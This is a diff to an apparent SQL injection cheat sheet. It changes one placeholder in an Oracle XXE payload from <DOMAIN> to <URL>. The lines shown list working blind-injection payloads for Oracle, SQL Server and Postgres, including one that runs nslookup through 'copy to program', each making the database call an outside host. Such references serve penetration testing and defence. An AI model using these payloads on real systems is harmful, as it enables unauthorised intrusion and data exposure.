@@ -16,7 +16,7 @@
 - MySql / MariaDB - `SELECT sleep(10)`
 
 ## DNS Lookup (Blind Injection)
-- Oracle (v11.2.0.3 - v12.1.0.2) - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "<DOMAIN>/"> %remote;]>'),'/l') FROM dual`
+- Oracle (v11.2.0.3 - v12.1.0.2) - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "<URL>/"> %remote;]>'),'/l') FROM dual`
 - Oracle (Elevated privileges) - `SELECT UTL_INADDR.get_host_address('<DOMAIN>')`
 - Microsoft - `exec master..xp_dirtree '//<DOMAIN>/a'`
 - Postgres - `copy (SELECT '') to program 'nslookup <DOMAIN>'`
